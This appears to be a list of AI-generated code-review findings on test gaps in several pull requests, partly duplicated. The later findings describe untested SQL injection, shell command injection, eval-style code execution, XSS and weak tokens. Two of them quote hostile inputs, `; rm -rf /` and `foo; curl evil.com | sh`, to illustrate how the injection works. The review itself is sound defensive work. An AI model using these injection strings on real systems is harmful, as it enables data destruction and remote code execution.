findings.title: Test assertion does not verify the claimed behavior
findings.rationale: The test claims to verify that the extractor uses the registry default model when no workspace override is saved, but the only assertion is `expect(res.statusCode).toBe(202)`. That status only indicates the request was accepted—not that extraction succeeded, not that the correct model was used, and not that an error was avoided. The test would pass even if the extraction failed internally, used a wrong model, or errored due to a missing override. Because the test cannot fail while claiming to guard the intended regression, it is a CRITICAL gap.

findings.title: Test does not verify the claimed model-resolution behavior
findings.rationale: The test only asserts that the HTTP response status is 202. It does not verify that the model resolution used the registry default, that the mock LLM provider was invoked with the expected schema, or that any extraction side-effect (e.g., a database record) was produced. The endpoint returns 202 as an accepted-async response; without polling or checking downstream state, the test could pass even if the extraction logic silently failed, used an incorrect model, or skipped processing entirely. Because the test claims to guard the path 'use registry default when no workspace override is saved' yet cannot fail for that specific condition, it is a critical weakness.

findings.title: Missing test for workspace override present
findings.rationale: The PR title says 'cover the workspace model-override path', but only the negative case (no override) is tested. The complementary case – a workspace that has set a model override – is not exercised. Without it, a regression where the override is ignored would not be caught.

findings.title: Test does not verify model-selection behavior despite claiming to
findings.rationale: This test is intended to verify that when a workspace has not chosen a model, the extraction uses the registry default instead of erroring. However, the test only asserts that the endpoint returns 202 — it never checks which model was actually used (e.g., by verifying the LLM mock input or a database record of the model). A 202 response could be emitted regardless of model selection, so this test would pass even if the registry default was ignored or if an error was silently swallowed. The test does not actually guard the behavior it claims to cover.

findings.title: Test silently passes when Docker is unavailable
findings.rationale: beforeAll returns early when Docker is unavailable (line 10). afterAll and the it block also guard on pg being falsy. This means the test silently passes in environments without Docker, never executing the database assertions. If a regression were introduced in the query (e.g., wrong column, broken aggregation), the test would still report green. This is a real flake source in CI runners that lack Docker support.

findings.title: Only one PR tested; GROUP BY clause is not actually verified
findings.rationale: The query filters by a single pr.id, which is equivalent to a GROUP BY on that single PR. If the production query's GROUP BY clause were accidentally removed (e.g., returning a global sum instead of per-PR), this test would still pass because it only verifies a single PR. The test does not exercise the grouping logic.

findings.title: Missing edge cases: NULL cost, zero runs, status filtering
findings.rationale: The test inserts only two completed runs. It does not cover: (a) what happens when costUsd is NULL for some runs, (b) what happens when there are zero runs for a PR, (c) whether non-'done' statuses should be filtered (if the production query uses a WHERE status filter). These are plausible edge cases in the real schema or query logic.

findings.title: Test does not verify GROUP BY aggregation for multiple PRs
findings.rationale:
The test inserts runs for one PR only. If the production query omitted `GROUP BY pr_id`, the test would still pass because the `WHERE prId = ?` filter already restricts to that single PR. Consequently, the test does not validate that the grouping correctly partitions the sum across multiple PRs, which is the central behaviour the PR description claims to cover.

To guard the grouping, the test should insert runs for at least two PRs (with one or more runs each) and assert that the sum per PR is correct. The current setup is a narrow happy-path that does not catch a missing `GROUP BY` clause.

findings.title: Silent pass when Docker unavailable
findings.rationale: Declared in a block that references no file

matched_title: Test passes with zero assertions when Docker is unavailable

findings.title: Test passes with zero assertions when Docker is unavailable
findings.rationale: The test silently passes without executing any assertions when Docker is not available. In `beforeAll` (line 17) and the `it` block (line 25) the functions return early without failing. Vitest reports the test as passed even though no assertion was reached, giving false confidence in environments without Docker. Per project convention, integration tests should be named `*.it.test.ts` and may already be expected to have Docker; using an unconditional `return` instead of `it.skipIf` or a dedicated skip mechanism masks infrastructure gaps.

findings.title: Test assertion contradicts column definition — fails on correct code
findings.rationale: The test expects `row.retryCount` not to be null, but the column is nullable (`integer('retry_count')` with no `.notNull()`) and the insert provides no value for it. Postgres will store NULL, so the assertion will always fail. This makes the test invalid: it cannot pass for the current schema and does not verify that a value round-trips correctly. The test should insert a known value (e.g., `retryCount: 3`) and assert `expect(row.retryCount).toBe(3)` instead.

findings.title: Assertion will always fail; test does not validate round-trip with actual retry value
findings.rationale: The test inserts an `agent_runs` row without specifying `retryCount` and then asserts that `row.retryCount` is not null. The column is defined as nullable with no default, so the inserted row will have `retryCount = null`, causing the assertion to always fail. This makes the test red on every run, blocking CI or being skipped as a known failure. Additionally, the test does not actually verify the round-trip of a specific retry value, so it provides no coverage for the new column's intended behavior.

matched_title: Test assertion that column is not null will always fail because the column is nullable and no value is provided

findings.title: Test assertion that column is not null will always fail because the column is nullable and no value is provided
findings.rationale: The schema defines `retryCount` as a nullable column with no default (`integer('retry_count')` without `.notNull()`). Inserting a run without specifying `retryCount` results in a database `NULL`. The assertion `expect(row.retryCount).not.toBeNull()` will therefore always fail, making the test red on every run and blocking CI. The test's intention was to verify the column round-trips, but it cannot fulfill that purpose because it never writes a non-null value.

matched_title: Test asserts non-null on a nullable column with no default — must always fail

findings.title: Test asserts non-null on a nullable column with no default — must always fail
findings.rationale: The test asserts `expect(row.retryCount).not.toBeNull()` after inserting an `agent_runs` row **without** specifying `retryCount`. In the schema (`server/src/db/schema/runs.ts:33`), `retryCount` is defined as a plain `integer('retry_count')` — no `.notNull()`, no `.default()`, no `.defaultNow()`. This makes the column nullable with an implicit default of `NULL`. Therefore the insertion will always store `NULL`, the subsequent `SELECT` will return `NULL`, and the assertion **must fail**. The test cannot pass in its current form, so it provides zero value and blocks CI. The correct approach is to insert a specific value (e.g., `retryCount: 2`) and assert equality, or to explicitly test the nullable default by asserting `toBeNull()`.

findings.title: Blocking-run test does not verify age independence
findings.rationale: The test 'keeps a blocking run regardless of age' uses the default age (51 days) without demonstrating that the age is completely irrelevant.  `shouldSweep` returns `false` before any age check when both `keepBlocking && blocked` are true, so the test would pass even if the age happened to be ≤ `policy.days`.  A stronger test would pass an extremely old `finishedAt` (e.g. 10 years ago) to make the age-independence explicit and guard against regression if the early-return condition is ever reordered.

findings.title: Blocking-run test relies on `DEFAULT_RETENTION` having `keepBlocking: true`
findings.rationale: The 'keeps a blocking run' test passes `DEFAULT_RETENTION` and implicitly assumes its `keepBlocking` field is truthy.  If the default is ever changed to `keepBlocking: false` (e.g. as a config migration), this test silently flips meaning and starts failing – even if `shouldSweep` itself still works correctly.  Coupling a new feature test to an unrelated default constant makes the test brittle.

findings.title: Age-boundary conditions untested
findings.rationale: The age-boundary logic (exactly `policy.days` old, and just under) is not tested.  The existing tests use a fixed 51-day-old run, but `policy.days` is never varied to verify the `>` operator.  A change from `>` to `>=` or an off-by-one adjustment would not be caught.

matched_title: New tests for keepBlocking guard depend on implicit defaults and may become ineffective

findings.title: New tests for keepBlocking guard depend on implicit defaults and may become ineffective
findings.rationale: Line 20 uses `DEFAULT_RETENTION` without explicitly setting `keepBlocking: true`. The test name asserts `when keepBlocking is set`, but the actual value depends on an external constant. If `DEFAULT_RETENTION.keepBlocking` is ever changed to `false` (or is undefined by default), this test would silently lose the intended coverage: it would then test the `keepBlocking: false` path (same as line 26) rather than the new guard. Additionally, both this test and the one on line 26 rely on the run's age (51 days) exceeding `DEFAULT_RETENTION.days`. If that constant is changed to e.g. 60, neither test would actually verify whether the new branching logic works—they would pass even if the `keepBlocking` guard were removed. This makes the tests fragile and their correctness context-dependent.

matched_title: SQL injection in ShareRepository is untested

findings.title: SQL injection in ShareRepository is untested
findings.rationale: All four queries in `ShareRepository` concatenate user-controlled values (`token`, `sort`, `digestId`, `passwordHash`) directly into SQL strings via template literals. No test validates that input is parameterized or that an injection attempt fails. The diff adds zero tests for this file, so the SQL injection vector is completely unguarded by tests.

findings.title: Shell command injection in exportDigest is untested
findings.rationale: `exportDigest` uses `execSync` with `digestId` directly interpolated into a shell command (`mkdir -p ${EXPORT_DIR} && tar -czf ${target} -C ${EXPORT_DIR} ${digestId}`). A malicious `digestId` can execute arbitrary OS commands. No test covers this path or validates input sanitization.

findings.title: Arbitrary code execution in renderTemplate is untested
findings.rationale: `renderTemplate` uses `new Function(...keys, `return (${expr});`)` to evaluate arbitrary expression strings extracted from `{{...}}` blocks in the digest body. The `scope` parameter contains data from query parameters (user-controlled). This allows arbitrary JavaScript execution in the Node process. No test verifies that expression evaluation is sandboxed or that malicious expressions are rejected.

findings.title: XSS via dangerouslySetInnerHTML is untested
findings.rationale: The client component renders `digest.html` via `dangerouslySetInnerHTML`. The HTML comes from the server-side `renderTemplate` which does not sanitize the output. An attacker who controls the digest body (or whose injected expression results in HTML) can execute arbitrary JavaScript in the reader's browser. No tests verify that the rendered HTML is sanitized or that XSS payloads are blocked.

findings.title: Open redirect in share/login/callback is untested
findings.rationale: The `/share/login/callback` endpoint redirects to `req.query.next ?? '/'` with no validation. An attacker can use this as an open redirect to phishing sites. No tests verify that `next` is a safe, relative URL or that external URLs are rejected.

findings.title: Weak token generation in generateShareToken is untested
findings.rationale: `generateShareToken` uses `Math.random()` which is not cryptographically secure. Share tokens are used as bearer capabilities for accessing potentially sensitive digests. An attacker who predicts the token (or enumerates a small keyspace of 10-character alphanumeric strings) can access any shared digest. No tests verify token entropy or that tokens are unpredictable.

findings.title: Hardcoded secrets in constants.ts are untested
findings.rationale: `SHARE_SIGNING_SECRET` and `MAINTENANCE_API_TOKEN` are hardcoded in source code. These secrets are used in production (`headers: { authorization: 'Bearer ${MAINTENANCE_API_TOKEN}' }`) and would be checked into version control. No tests verify that secrets are loaded from environment variables or that the source does not contain actual credentials.

matched_title: No test covers SQL injection in repository queries

findings.title: No test covers SQL injection in repository queries
findings.rationale: No test exists that verifies the `findByToken` method injects the token safely. The production code concatenates the token directly into a SQL query via `sql.raw(\`... WHERE s.token = '${token}'\`)`, making it trivially injectable. Without a test that passes a malicious token (e.g. `' OR 1=1`) and verifies an error or safe behavior, any future refactoring that might fix the injection lacks a regression guard.

findings.title: No test covers command injection in exportDigest
findings.rationale: The `exportDigest` method shells out with `execSync(\`mkdir -p … && tar -czf ${target} …\`)` where `target` is built from the user-supplied `format` parameter. No test verifies that a malicious `format` (e.g. `; rm -rf /`) is rejected or escaped. Without a test blocking command injection, a deployment or test environment is at risk.

findings.title: No test covers command injection in snapshotExports
findings.rationale: The `snapshotExports` method passes the `label` parameter directly into `execSync(\`tar -czf /var/app/snapshots/${label}.tgz …\`)`. No test verifies that a label such as `foo; curl evil.com | sh` is rejected. The same unfiltered string is then sent as JSON to the maintenance API. Without tests, this path is unguarded against injection.

findings.title: No test verifies authentication on protected share endpoints
findings.rationale: `POST /digests/:id/share` and `POST /digests/:id/export` call `getContext(app.container, req)` to enforce authentication, but there is no test that verifies an unauthenticated request is rejected with a 401/403. Without that test, a future refactoring that accidentally removes or bypasses the call would not be caught.

findings.title: Token generation uses weak randomness with no collision test
findings.rationale: `generateShareToken` uses `Math.random().toString(36).slice(2, 12)` to produce a 10-character token. This is not cryptographically random (predictable) and has no collision test. A brute-force attacker could guess valid tokens. No test verifies token uniqueness or entropy. While the severity is lower than the injection issues, the PR claims the token "is the capability", making it a security boundary.

findings.title: Password hashing uses MD5 with no test documenting expected behavior
findings.rationale: `hashSharePassword` uses MD5, which is not a password hashing algorithm (fast, unsalted, collision-susceptible). No test verifies that the hash is resistant to brute force or that a salt is applied. While this is a production code issue, the complete absence of a test means no expectation is documented; a later change to bcrypt/argon2 would have no regression guard.

matched_title: No tests for any share/export routes

findings.title: No tests for any share/export routes
findings.rationale: No server-side tests exist for the share module. The POST /digests/:id/share route (lines 24-36) depends on `getContext()` for authentication. Without a test, a regression that removes this auth call would go undetected, allowing unauthenticated share creation. All other routes (lines 38-83) are equally untested, so any security or correctness regression in these endpoints would slip through. Per the rules, an untested path that could skip authorization is a CRITICAL gap.

findings.title: No client tests for SharedDigestView
findings.rationale: The client component has zero tests for its rendering states (loading, error, HTML body). With `fetch` mocked per stack context, a test could verify that the loading message appears, that an API error shows the error string, and that a successful response renders the HTML inside `dangerouslySetInnerHTML`. Missing these tests means UI regressions (e.g., broken error display, XSS exposure if HTML sanitization is added later) are invisible to the test suite.

findings.title: No tests for repository that uses raw SQL interpolation
findings.rationale: The repository directly interpolates user‑controlled strings into SQL via `sql.raw` (e.g., `token` at line 23, `sort` at line 47, `digestId` at line 53, `input.digestId` and `input.passwordHash` at lines 63-67). No tests exist that would catch SQL injection vulnerabilities. While the production code is the root cause, the total absence of repository tests means no safety net for injection regressions.
